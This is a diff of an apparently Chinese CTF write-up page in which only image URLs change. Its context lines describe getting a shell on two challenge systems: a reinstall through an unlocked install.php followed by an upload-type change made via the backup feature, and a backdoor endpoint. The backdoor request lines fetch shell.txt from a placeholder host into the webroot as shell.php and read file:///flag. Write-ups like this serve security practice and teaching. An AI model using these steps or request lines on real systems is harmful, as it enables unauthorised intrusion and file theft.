@@ -113,23 +113,23 @@
 <li>首先直奔<code>install.php</code>发现源码中并没有做出重装限制，并且在<code>config.php</code>可以知道数据库和账号密码直接重装系统拿下后台。</li>
 <li>拿下后台发现系统设置处可以修改上传文件类型。</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745165921699.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745165921699.png" alt="img"></p>
 <ul>
 <li>但是加入php后缀你发现会将phpt替换为X,从源码中可有很直观看到这点。</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745169665422.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745169665422.png" alt="img"></p>
 <ul>
 <li>此时毫无头绪，代码审计数量太大，所以黑盒测试一下，发现数据备份处可以执行sql语句。本以为可以直接写文件，但是失败了，联想到上面上传文件后缀我们可以直接在备份文件里面修改后缀是PHP，最后直接getshell即可。</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745175748287.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745175748287.png" alt="img"></p>
 <ul>
 <li>导入备份后发现设置中的上传后缀有php</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745180341751.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745180341751.png" alt="img"></p>
 <ul>
 <li>直接上传php文件直接getshell</li>
 </ul>
-<p><img src="https://www.mycute.cn/static/umeditor/php/upload/20191123/15745181028456.png" alt="img"></p>
+<p><img src="http://goodcheerleung.gitee.io/mycute/20191123/15745181028456.png" alt="img"></p>
 <h2 id="粤湾基金"><a href="#粤湾基金" class="headerlink" title="粤湾基金"></a>粤湾基金</h2><p>/index.php/home/test存在一处后门直接可getflag</p>
 <pre><code>// /Home/Test/dlfile?file_url=http://xxxx/shell.txt&amp;save_to=/var/www/html/shell.php
 ///Home/Test/dlfile?file_url=file:///flag&amp;save_to=/var/www/html/1.txt
